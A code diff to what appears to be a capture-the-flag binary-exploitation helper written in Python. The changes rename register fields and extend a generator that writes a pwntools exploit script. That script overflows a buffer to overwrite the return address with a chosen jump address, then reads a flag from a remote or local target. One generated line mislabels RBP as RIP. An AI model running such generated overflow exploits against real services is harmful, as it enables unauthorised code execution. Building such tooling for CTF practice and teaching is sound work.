@@ -314,10 +314,10 @@ def dispMenu():
    else:
       print("RIP/EIP      ", end=' ')   
    print( '\u2551', end=' ')
-   if INSP[:18] == "0x0000000000000000":
-      print(colored(INSP,colour7), end=' ')
+   if RIP[:18] == "0x0000000000000000":
+      print(colored(RIP,colour7), end=' ')
    else:
-      print(colored(INSP,colour6), end=' ')         
+      print(colored(RIP,colour6), end=' ')         
    print('\u2551', end=' ')   
    if BITS[:6] == "64-Bit":
       print(colored("         +8 Bytes ",colour2), end=' ')
@@ -363,7 +363,7 @@ def dispMenu():
    print(colored(GADD[10],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + " CUS1  ADDRESS " + '\u2551', end=' ')   
+   print('\u2551' + " JUMP  ADDRESS " + '\u2551', end=' ')   
    if CUS1[:18] == "0x0000000000000000":
       print(colored(CUS1,colour7), end=' ')
    else:
@@ -405,7 +405,7 @@ def dispMenu():
 def options():
    print('\u2551' + "(01) Set  ACCUMULATOR (11) Set MAIN ADDRESS (21) Read   Headers (31) Pattern   Creater (41) HEX Editor   " + '\u2551' + " REMOTE FILE INFORMATION " + (" ")*33 + '\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(02) Set BASE POINTER (12) Set CUS1 ADDRESS (22) Read   Objects (32) Program Interface (42) Ghidra       " + '\u2560' + ('\u2550')*58 + '\u2563')
+   print('\u2551' + "(02) Set BASE POINTER (12) Set JUMP ADDRESS (22) Read   Objects (32) Program Interface (42) Ghidra       " + '\u2560' + ('\u2550')*58 + '\u2563')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(03) Set LOOP COUNTER (13) Set CUS2 ADDRESS (23) Read   Section (33) L-Trace Interface (43) ImmunityDeBug" + '\u2551' + " FILE NAME      ", end=' ')
    if FIL[:7] == "unknown":
@@ -466,7 +466,7 @@ def options():
       print(colored(LIBC[:COL2-5],colour6), end=' ')
    print('\u2551') 
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(09) Set INSP POINTER (19) Radar2 Functions (29) Read Stab Data (39) Dis-Assemble ADDR (49) Run Exploit  " + '\u2551' + "                                                          " + '\u2551')
+   print('\u2551' + "(09) Set INST POINTER (19) Radar2 Functions (29) Read Stab Data (39) Dis-Assemble ADDR (49) Run Exploit  " + '\u2551' + "                                                          " + '\u2551')
    print('\u2551' + "(10) Set STARTADDRESS (20) Find all Gadgets (30) Read HexFormat (40) RESERVED          (50) Exit         " + '\u2551' + "                                                          " + '\u2551')
    print('\u255A' + ('\u2550')*105 + '\u2569' +  ('\u2550')*58 + '\u255D') #colored("VALUE",colour5)
    return
@@ -579,7 +579,7 @@ BITS = spacePadding("unknown", COL1)
 MODE = spacePadding("unknown", COL1)
 LIBC = spacePadding("unknown", COL2)
 
-INSP = "0x0000000000000000"
+RIP = "0x0000000000000000"
 MAIN = "0x0000000000000000"
 CUS1 = "0x0000000000000000"
 CUS2 = "0x0000000000000000"
@@ -638,7 +638,7 @@ IND = spacePadding(IND, COL1)
 ARC = spacePadding(ARC, COL1)
 FIL = spacePadding(FIL, COL3)
 SRT = spacePadding(SRT, COL1)
-INSP = spacePadding(INSP, COL1)
+RIP = spacePadding(RIP, COL1)
 
 command("sleep 5s")
    
@@ -815,12 +815,12 @@ while True:
 # -------------------------------------------------------------------------------------      
       
    if selection =='9':
-      BAK = INSP
-      INSP = input("[?] Please enter extended instruction pointer address: ")
-      if INSP != "":
-         INSP = spacePadding(INSP,COL1)
+      BAK = RIP
+      RIP = input("[?] Please enter extended instruction pointer address: ")
+      if RIP != "":
+         RIP = spacePadding(RIP,COL1)
       else:
-            INSP = BAK
+            RIP = BAK
       prompt()  
       
 # ------------------------------------------------------------------------------------- 
@@ -867,7 +867,7 @@ while True:
       
    if selection =='12':
       BAK = CUS1
-      CUS1 = input("[?] Please enter custom address 1: ")
+      CUS1 = input("[?] Please enter address to jump to: ")
       if CUS1 != "":
          CUS1 = spacePadding(CUS1,COL1)
       else:
@@ -1075,16 +1075,17 @@ while True:
          with open("functions.tmp", "r") as functions:
             for x in range(0, maxDispl):
                FUNC[x] = functions.readline().rstrip(" ")
-               FUNC[x] = spacePadding(FUNC[x], COL2)        
-         command("cat functions.tmp | grep 'start' > start.tmp ")
-         with open("start.tmp","r") as start:
-            SRT = spacePadding(start.readline().split(" ")[0], COL1)
+               FUNC[x] = spacePadding(FUNC[x], COL2)               
+         if SRT[:18] == "0x0000000000000000": 
             print("[+] Adding START address to registers...")               
-        
-         command("cat functions.tmp | grep 'main' > main.tmp ")
-         with open("main.tmp","r") as main:
-            MAIN = spacePadding(main.readline().split(" ")[0], COL1)
-            print("[+] Adding MAIN  address to registers...")                           
+            command("cat functions.tmp | grep 'start' > start.tmp ")
+            with open("start.tmp","r") as start:
+               SRT = spacePadding(start.readline().split(" ")[0], COL1)
+         if MAIN[:18] == "0x0000000000000000":
+            print("[+] Adding MAIN address to registers...")
+            command("cat functions.tmp | grep 'main' > main.tmp ")
+            with open("main.tmp","r") as main:
+               MAIN = spacePadding(main.readline().split(" ")[0], COL1)
          command("mv functions.tmp " + localDir + "/functions.txt")
       prompt()
       
@@ -1110,17 +1111,15 @@ while True:
          parsFile("output.tmp")
          catsFile("output.tmp")
          if SRT[:18] == "0x0000000000000000":
+            print("[+] Adding START address to registers...")         
             command("cat output.tmp | grep entry0 > entry.tmp")
             with open("entry.tmp","r") as address:
-               SRT = address.readline().split(" ")[0]
-               SRT = spacePadding(SRT, COL1)
-               print("[+] Adding START address to registers...")         
+               SRT = spacePadding(address.readline().split(" ")[0], COL1)
          if MAIN[:18] == "0x0000000000000000":
+            print("[+] Adding MAIN  address to registers...")         
             command("cat output.tmp | grep main > main.tmp")
             with open("main.tmp","r") as address:
-               MAIN = address.readline().split(" ")[0]
-               MAIN = spacePadding(MAIN, COL1)
-               print("[+] Adding MAIN  address to registers...")
+               MAIN = spacePadding(address.readline().split(" ")[0], COL1)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1686,7 +1685,7 @@ while True:
          command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'context.clear()' >> " + localDir + "/exploit.py")
-         command("echo 'context.log_level = \"debug\"' >> " + localDir + "/exploit.py")
+         command("echo 'context.log_level = \"info\" # debug' >> " + localDir + "/exploit.py")
          command("echo 'context.binary = \"./" + FIL.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
          if COM[:3] == "ELF":
@@ -1698,41 +1697,58 @@ while True:
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'try:' >> " + localDir + "/exploit.py")
-         command("echo '   s = remote(\"" + remAddr.rstrip(" ") + "\", " + remPort.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         if remAddr[:7] == "unknown":
+            command("echo '   s = remote(\"0\",0)' >> " + localDir + "/exploit.py")
+         else:
+            command("echo '   s = remote(\"" + remAddr.rstrip(" ") + "\", " + remPort.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'except:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
         
-        # ADD OTHER REGISTER HERE!!
-        
+         command("echo 'RAX = " + RAX.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RBX = " + RBX.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RCX = " + RCX.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RDX = " + RDX.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RSI = " + RSI.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RDI = " + RDI.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RSP = " + RSP.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RIP = " + RBP.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'RIP = " + RIP.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+
+         command("echo '' >> " + localDir + "/exploit.py")        
          command("echo 'start = " + SRT.rstrip(" ") + "' >> " + localDir + "/exploit.py")
          command("echo 'main  = " + MAIN.rstrip(" ") + "' >> " + localDir + "/exploit.py")
-         command("echo 'cus1  = " + CUS1.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'jump  = " + CUS1.rstrip(" ") + "' >> " + localDir + "/exploit.py")
          command("echo 'cus2  = " + CUS2.rstrip(" ") + "' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
-         command("echo 'buffers   = \"a\" * " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
-         command("echo 'integer   = \"a\" * 4' >> " + localDir + "/exploit.py")
+         command("echo 'buffers = \"a\" * " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
+         command("echo 'integer = \"a\" * 4' >> " + localDir + "/exploit.py")
          if BITS[:2] == "64":
-            command("echo 'pointer   = \"a\" * 8' >> "+ localDir + "/exploit.py")
+            command("echo 'pointer = \"a\" * 8' >> "+ localDir + "/exploit.py")
          else:
-            command("echo 'pointer   = \"a\" * 4' >> "+ localDir + "/exploit.py")         
-         command("echo 'padding   = \"a\" * 4' >> "+ localDir + "/exploit.py")  
-         command("echo 'overwrite = p64(cus1)' >> "+ localDir + "/exploit.py")          
-         command("echo 'term      = \"\\\\n\"' >> " + localDir + "/exploit.py")         
+            command("echo 'pointer = \"a\" * 4' >> "+ localDir + "/exploit.py")         
+         command("echo 'padding = \"a\" * 4' >> "+ localDir + "/exploit.py")  
          command("echo '' >> " + localDir + "/exploit.py")
-         command("echo 'payload = flat(buffers,overwrite,term)' >> " + localDir + "/exploit.py")
-         command("echo '# print(payload)' >> " + localDir + "/exploit.py")
+         command("echo 'overwrite = p64(jump)' >> "+ localDir + "/exploit.py")          
+         command("echo 'terminate = \"\\\\n\"' >> " + localDir + "/exploit.py")         
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'if jump != 0:' >> " + localDir + "/exploit.py")
+         command("echo '   payload = flat(buffers,overwrite,terminate)' >> " + localDir + "/exploit.py")
+         command("echo '#   print(payload)' >> " + localDir + "/exploit.py")
+         command("echo 'else:' >> " + localDir + "/exploit.py")
+         command("echo '   print(\"No exploit...\")' >> "  + localDir + "/exploit.py")
+         command("echo '   exit(1)'  >> "  + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 's.recvuntil(\"Enter your name :\")' >> " + localDir + "/exploit.py")
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
          command("echo 's.recvuntil(\"Congratulations!\\\\n\")'  >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
          command("echo 'success(flag)' >> " + localDir + "/exploit.py")
          command("echo '# s.interactive()' >> " + localDir + "/exploit.py")
          command("echo 's.close()' >> " + localDir + "/exploit.py")
          print(colored("[*] Python exploit template sucessfully created...", colour3))
-      prompt()              
-         
+      prompt()                       
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1747,7 +1763,7 @@ while True:
          print("[-] Filename not specified...")
       else:  
          os.chdir(localDir)
-         command("echo 'YOU HAVE FOUND THE GOLDEN ELF' > flag.txt")  
+         command("echo 'THE GOLDEN ELF GRANTS YOU ACCESS' > flag.txt")  
          os.system("python3 exploit.py")
          os.chdir("..")
       prompt()
